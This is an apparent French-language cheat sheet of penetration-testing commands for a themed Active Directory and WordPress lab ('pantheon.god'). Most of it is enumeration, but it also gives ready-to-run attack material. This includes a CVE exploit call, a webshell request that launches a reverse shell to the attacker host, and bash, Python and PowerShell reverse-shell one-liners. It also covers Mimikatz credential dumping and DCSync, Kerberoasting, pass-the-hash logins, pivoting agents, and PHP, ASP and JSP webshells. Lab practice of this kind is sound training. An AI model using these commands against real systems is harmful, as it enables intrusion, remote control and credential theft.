# Commandes Utiles

## 🔍 Énumération

### Énumération Réseau

```bash
# Découverte du réseau
nmap -sn 192.168.56.1/24

# Scan complet d'une machine
nmap -sC -sV -p- 192.168.56.10

# Scan rapide des ports communs
nmap -F 192.168.56.10

# Scan UDP des ports importants
nmap -sU -p 53,123,161 192.168.56.10
```

### Énumération Web

```bash
# Scan WordPress avec WPScan
wpscan --url http://192.168.56.10 --plugins-detection aggressive
wpscan --url http://192.168.56.10 --usernames hermes --passwords /usr/share/wordlists/rockyou.txt

# Énumération de répertoires
gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php

# Énumération de sous-domaines
gobuster vhost -u http://192.168.56.10 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Énumération Active Directory

```bash
# Énumération SMB
nxc smb 192.168.56.11 -u user -p pass --shares
nxc smb 192.168.56.11 -u user -p pass --users
nxc smb 192.168.56.11 -u user -p pass --groups

# Énumération LDAP
ldapsearch -H ldap://192.168.56.11 -D "user@domain" -w password -b "DC=pantheon,DC=god" "(objectClass=user)"
ldapsearch -H ldap://192.168.56.11 -D "user@domain" -w password -b "DC=pantheon,DC=god" "(objectClass=group)"

# BloodHound
bloodhound-python -d pantheon.god -u user -p pass -c All
```

## 🚀 Exploitation

### Exploitation WordPress

```bash
# Exploitation CMP Coming Soon
python3 CVE-2025-32118.py -u http://192.168.56.10 -un hermes -p mondieu

# Upload de shell via webshell
curl "http://192.168.56.10/wp-content/plugins/cmp-premium-themes/nxploitedshell/nxploitedshell.php" \
  --get --data-urlencode "cmd=bash -c 'sh -i >& /dev/tcp/192.168.56.1/9001 0>&1'"
```

### Reverse Shell

```bash
# Bash reverse shell
bash -c 'bash -i >& /dev/tcp/192.168.56.1/9001 0>&1'

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# PowerShell reverse shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 🔐 Active Directory

### Authentification

```bash
# Authentification Kerberos
kinit hermes@PANTHEON.GOD

# Authentification NTLM
nxc smb 192.168.56.11 -u hermes -p mondieu

# Authentification avec hash
nxc smb 192.168.56.11 -u hermes -H aad3b435b51404eeaad3b435b51404ee:hash
```

### Énumération Avancée

```bash
# Énumération des utilisateurs
nxc ldap 192.168.56.11 -u user -p pass --users

# Énumération des groupes
nxc ldap 192.168.56.11 -u user -p pass --groups

# Énumération des SPN
nxc ldap 192.168.56.11 -u user -p pass --spn

# Énumération des ACL
nxc ldap 192.168.56.11 -u user -p pass --acl
```

### Attaques Kerberos

```bash
# AS-REP Roasting
nxc ldap 192.168.56.11 -u user -p pass --as-rep-roast

# Kerberoasting
nxc ldap 192.168.56.11 -u user -p pass --kerberoast

# S4U2Self
nxc ldap 192.168.56.11 -u user -p pass --s4u2self
```

## 🎯 Privilege Escalation

### Linux

```bash
# Recherche de fichiers SUID
find / -perm -u=s -type f 2>/dev/null

# Recherche de fichiers avec capacités
getcap -r / 2>/dev/null

# Recherche de cron jobs
crontab -l
ls -la /etc/cron*

# Recherche de services
systemctl list-units --type=service --state=running

# Recherche de variables d'environnement
env | grep -i pass
```

### Windows

```powershell
# Énumération des privilèges
whoami /priv

# Énumération des groupes
whoami /groups

# Énumération des services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Énumération des tâches planifiées
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}

# Énumération des processus
Get-Process | Where-Object {$_.ProcessName -like "*admin*"}
```

## 🔄 Lateral Movement

### Pivot Réseau

```bash
# Configuration de ligolo-ng
# Sur la machine d'attaque
./ligolo -selfcert -laddr 0.0.0.0:11601

# Sur la machine compromise
./ligolo-agent -connect 192.168.56.1:11601 -ignore-cert

# Configuration de chisel
# Sur la machine d'attaque
./chisel server -p 8080 --reverse

# Sur la machine compromise
./chisel client 192.168.56.1:8080 R:0.0.0.0:1080:socks
```

### Accès RDP

```bash
# Connexion RDP
xfreerdp /v:192.168.56.11 /u:hermes /p:mondieu

# Connexion RDP avec hash
xfreerdp /v:192.168.56.11 /u:hermes /pth:hash

# Connexion RDP avec proxy
proxychains xfreerdp /v:192.168.56.11 /u:hermes /p:mondieu
```

## 🛠️ Outils de Post-Exploitation

### Mimikatz

```powershell
# Dump des credentials en mémoire
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"

# Dump des tickets Kerberos
mimikatz.exe "privilege::debug" "kerberos::list"

# Dump des hashes SAM
mimikatz.exe "privilege::debug" "lsadump::sam"

# Dump des secrets LSA
mimikatz.exe "privilege::debug" "lsadump::secrets"

# DCSync
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:pantheon.god /user:krbtgt"
```

### PowerView

```powershell
# Énumération des utilisateurs
Get-NetUser

# Énumération des groupes
Get-NetGroup

# Énumération des ordinateurs
Get-NetComputer

# Énumération des GPO
Get-NetGPO

# Énumération des ACL
Get-ObjectAcl -Identity "Domain Admins"
```

### BloodHound

```bash
# Collecte de données
bloodhound-python -d pantheon.god -u user -p pass -c All

# Import dans Neo4j
# Ouvrir BloodHound et importer les fichiers JSON
```

## 📊 Monitoring et Logs

### Logs Linux

```bash
# Logs d'authentification
tail -f /var/log/auth.log

# Logs Apache
tail -f /var/log/apache2/access.log
tail -f /var/log/apache2/error.log

# Logs système
tail -f /var/log/syslog

# Logs MySQL
tail -f /var/log/mysql/error.log
```

### Logs Windows

```powershell
# Événements de sécurité
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Select-Object -First 10

# Événements de connexion
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624,4625} | Select-Object -First 10

# Événements de création de compte
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4720} | Select-Object -First 10

# Événements de modification de groupe
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4728,4729} | Select-Object -First 10
```

## 🔧 Utilitaires

### Conversion de Formats

```bash
# Conversion hash NTLM
echo -n "password" | iconv -f UTF-8 -t UTF-16LE | openssl md4

# Conversion base64
echo "password" | base64
echo "cGFzc3dvcmQ=" | base64 -d

# Conversion hex
echo "password" | xxd -p
echo "70617373776f7264" | xxd -p -r
```

### Création de Payloads

```bash
# Création d'un shell PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Création d'un shell ASP
echo '<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>' > shell.asp

# Création d'un shell JSP
echo '<%@ page import="java.util.*,java.io.*"%><%Runtime.getRuntime().exec(request.getParameter("cmd"));%>' > shell.jsp
```

## 🎭 Commandes Thématiques

### Configuration DNS

```bash
# Ajout des entrées DNS
echo "192.168.56.10 pantheon.god olympe.god" | sudo tee -a /etc/hosts
echo "192.168.56.11 dc01.pantheon.god" | sudo tee -a /etc/hosts
echo "192.168.56.12 enfers.pantheon.god" | sudo tee -a /etc/hosts
```

### Configuration Kerberos

```bash
# Configuration krb5.conf
sudo tee /etc/krb5.conf << EOF
[libdefaults]
    default_realm = PANTHEON.GOD
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    PANTHEON.GOD = {
        kdc = dc01.pantheon.god
        admin_server = dc01.pantheon.god
    }

[domain_realm]
    .pantheon.god = PANTHEON.GOD
    pantheon.god = PANTHEON.GOD
EOF
```

---

*Ces commandes sont vos armes dans la quête de l'Olympe numérique. Maîtrisez-les et vous deviendrez invincible !* ⚡🗡️ 